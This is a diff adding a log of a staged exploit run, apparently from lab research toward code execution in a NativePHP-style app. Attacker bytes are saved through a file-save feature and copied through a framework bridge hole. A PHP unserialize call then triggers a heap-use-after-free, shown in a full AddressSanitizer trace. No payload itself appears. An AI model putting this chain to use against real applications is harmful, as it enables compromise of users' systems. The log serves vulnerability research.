@@ -1,0 +1,89 @@
+=== stage 1: persist attacker bytes (app file-save feature) ===
+200 {"success":true,"path":"\/mnt\/c\/Users\/andre\/Downloads\/php2shell-claude\/nativephp_lane\/lab\/storage\/app\/uploads\/user-content.bin","bytes":10142}
+
+=== stage 2: File.Copy raw-path (framework bridge hole) ===
+200 {"status":"success","data":{"success":true}}
+
+=== stage 3: AsyncTask.Dispatch -> runner lane unserialize ===
+runner_exit = 1
+runner_bin = /tmp/php8512_build/asan2/sapi/cli/php
+runner_alloc = 0
+--- runner output ---
+payload_len=10142
+=================================================================
+==1598505==ERROR: AddressSanitizer: heap-use-after-free on address 0x525000007900 at pc 0x57e29f4a90b2 bp 0x7ffdfd0acc20 sp 0x7ffdfd0acc10
+READ of size 8 at 0x525000007900 thread T0
+    #0 0x57e29f4a90b1 in php_var_unserialize /tmp/php8512_build/php-8.5.12/ext/standard/var_unserializer.c:906
+    #1 0x57e29f4be858 in php_unserialize_with_options /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1544
+    #2 0x57e29f4bf5b3 in zif_unserialize /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1602
+    #3 0x57e29f90c2b3 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:1360
+    #4 0x57e29f90c2b3 in execute_ex /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:116550
+    #5 0x57e29f78414f in zend_call_function /tmp/php8512_build/php-8.5.12/Zend/zend_execute_API.c:1039
+    #6 0x57e29f78575c in zend_call_known_function /tmp/php8512_build/php-8.5.12/Zend/zend_execute_API.c:1136
+    #7 0x57e29fa0717e in zend_call_known_instance_method /tmp/php8512_build/php-8.5.12/Zend/zend_API.h:904
+    #8 0x57e29fa0717e in zend_call_known_instance_method_with_0_params /tmp/php8512_build/php-8.5.12/Zend/zend_API.h:910
+    #9 0x57e29fa0717e in zend_objects_destroy_object /tmp/php8512_build/php-8.5.12/Zend/zend_objects.c:172
+    #10 0x57e29fa06082 in zend_objects_store_del /tmp/php8512_build/php-8.5.12/Zend/zend_objects_API.c:181
+    #11 0x57e29fa45973 in rc_dtor_func /tmp/php8512_build/php-8.5.12/Zend/zend_variables.c:57
+    #12 0x57e29f4a8bb6 in i_zval_ptr_dtor /tmp/php8512_build/php-8.5.12/Zend/zend_variables.h:45
+    #13 0x57e29f4a8bb6 in var_destroy /tmp/php8512_build/php-8.5.12/ext/standard/var_unserializer.c:319
+    #14 0x57e29f4a8fa8 in php_var_unserialize_destroy /tmp/php8512_build/php-8.5.12/ext/standard/var_unserializer.c:94
+    #15 0x57e29f4be98f in php_unserialize_with_options /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1578
+    #16 0x57e29f4bf5b3 in zif_unserialize /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1602
+    #17 0x57e29f90c992 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:1426
+    #18 0x57e29f90c992 in execute_ex /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:116555
+    #19 0x57e29f904e60 in zend_execute /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:122038
+    #20 0x57e29fa5be9d in zend_execute_script /tmp/php8512_build/php-8.5.12/Zend/zend.c:1990
+    #21 0x57e29f54af32 in php_execute_script_ex /tmp/php8512_build/php-8.5.12/main/main.c:2688
+    #22 0x57e29f54b5b9 in php_execute_script /tmp/php8512_build/php-8.5.12/main/main.c:2728
+    #23 0x57e29fa5f880 in do_cli /tmp/php8512_build/php-8.5.12/sapi/cli/php_cli.c:960
+    #24 0x57e29fa62015 in main /tmp/php8512_build/php-8.5.12/sapi/cli/php_cli.c:1383
+    #25 0x7251f8a29d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
+    #26 0x7251f8a29e3f in __libc_start_main_impl ../csu/libc-start.c:392
+    #27 0x57e29ec30f84 in _start (/tmp/php8512_build/asan2/sapi/cli/php+0x430f84)
+
+0x525000007900 is located 0 bytes inside of 8160-byte region [0x525000007900,0x5250000098e0)
+freed by thread T0 here:
+    #0 0x7251f90b4537 in __interceptor_free ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:127
+    #1 0x57e29f695245 in __zend_free /tmp/php8512_build/php-8.5.12/Zend/zend_alloc.c:3976
+    #2 0x7ffdfd0ad6cf  ([stack]+0x1a6cf)
+    #3 0x57e2a00ce58d  (/tmp/php8512_build/asan2/sapi/cli/php+0x18ce58d)
+
+previously allocated by thread T0 here:
+    #0 0x7251f90b4887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
+    #1 0x57e29f6963d4 in __zend_malloc /tmp/php8512_build/php-8.5.12/Zend/zend_alloc.c:3947
+
+SUMMARY: AddressSanitizer: heap-use-after-free /tmp/php8512_build/php-8.5.12/ext/standard/var_unserializer.c:906 in php_var_unserialize
+Shadow bytes around the buggy address:
+  0x0a4a7fff8ed0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a4a7fff8ee0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a4a7fff8ef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a4a7fff8f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x0a4a7fff8f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+=>0x0a4a7fff8f20:[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0a4a7fff8f30: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0a4a7fff8f40: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0a4a7fff8f50: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0a4a7fff8f60: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+  0x0a4a7fff8f70: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==1598505==ABORTING
